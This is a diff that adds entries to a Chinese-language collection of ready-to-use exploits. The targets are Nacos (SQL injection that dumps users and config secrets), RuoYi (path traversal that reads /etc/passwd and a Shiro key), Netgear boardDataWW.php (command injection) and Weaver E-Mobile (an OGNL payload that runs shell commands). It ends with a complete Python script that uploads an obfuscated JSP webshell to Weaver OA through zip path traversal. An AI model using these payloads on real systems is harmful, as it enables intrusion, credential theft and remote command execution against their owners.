@@ -530,3 +530,131 @@ detail:
         - https://mp.weixin.qq.com/s/arBSXR1uyfMT4UEr16Yw-A
 ```
 
+## Nacos SQL注入漏洞
+
+```
+# 查询用户列表：
+/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20
+# 从CONFIG.INFO读取config信息，翻密码。
+/nacos/v1/cs/ops/derby?sql=select+*+from+CONFIG_INFO+st
+
+# 以下语句可以查询数据库中所有信息：
+select * from users
+select * from permissions
+select * from roles
+select * from tenant_info
+select * from tenant_capacity
+select * from group_capacity
+select * from config_tags_relation
+select * from app_configdata_relation_pubs
+select * from app_configdata_relation_subs
+select * from app_list
+select * from config_info_aggr
+select * from config_info_tag
+select * from config_info_beta
+select * from his_config_info
+select * from config_info
+```
+
+## 若依管理系统后台任意文件读取漏洞CNVD-2021-15555
+
+```
+/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd
+# 读java进程信息。
+/common/download/resource?
+resource=/profile/../../../../../../../../../../../../../../proc/sched_debug
+# 读shiro key
+/common/download/resource?
+resource=/profile/../../../../../../../../../../../../../../home/tongweb7/deploymen
+t/zzadmin/WEB-INF/classes/application.yml
+```
+
+##  Netgear 多款设备 boardDataWW.php 文件命令执行漏洞 
+
+```
+# 未授权访问/boardDataWW.php页面。
+# 输入框中输入：1111222233333;id>test.txt#
+# 访问/test.txt查看命令执行结果。
+```
+
+https://www.cnblogs.com/VxerLee/p/16434463.html
+
+## 泛微E-Mobile Ognl 表达式注入
+
+```
+# 登录页面：
+http://6.6.6.6/login.do?
+or
+http://6.6.6.6/login/login.do?
+
+# 测试：/login.do?message=66*66*66-66666
+# exp(可以post请求):
+message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
+```
+
+https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.sh0w.top/_index_php_archives_14_/index.html
+
+## 泛微OA weaver.common.Ctrl 任意文件上传漏洞
+
+```
+import zipfile
+import random
+import sys
+import requests
+def generate_random_str(randomlength=16):
+  random_str = ''
+  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
+  length = len(base_str) - 1
+  for i in range(randomlength):
+    random_str += base_str[random.randint(0, length)]
+  return random_str
+mm = generate_random_str(8)
+webshell_name1 = mm+'.jsp'
+webshell_name2 = '../../../'+webshell_name1
+def file_zip():
+    shell = """<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="sun.misc.BASE64Decoder" %>
+<%
+    if(request.getParameter("cmd")!=null){
+        BASE64Decoder decoder = new BASE64Decoder();
+        Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));
+        Process e = (Process)
+                rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new
+                        String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new
+                        Object[]{}), request.getParameter("cmd") );
+        java.io.InputStream in = e.getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("
+<pre>");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print("</pre>");
+    }
+%>
+    """   ## 替换shell内容
+    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
+    zf.writestr(webshell_name2, shell)
+def GetShell(urllist):
+    file_zip()
+    print('上传文件中')
+    urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'
+    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]
+    requests.post(url=urls,files=file,timeout=60, verify=False)
+    GetShellurl = urllist+'/cloudstore/'+webshell_name1
+    GetShelllist = requests.get(url = GetShellurl)
+    if GetShelllist.status_code == 200:
+        print('利用成功webshell地址为:'+GetShellurl)
+    else:
+        print('未找到webshell利用失败')
+def main():
+    if (len(sys.argv) == 2):
+        url = sys.argv[1]
+        GetShell(url)
+    else:
+        print("python3 poc.py http://xx.xx.xx.xx")
+if __name__ == '__main__':
+    main()
+```
+
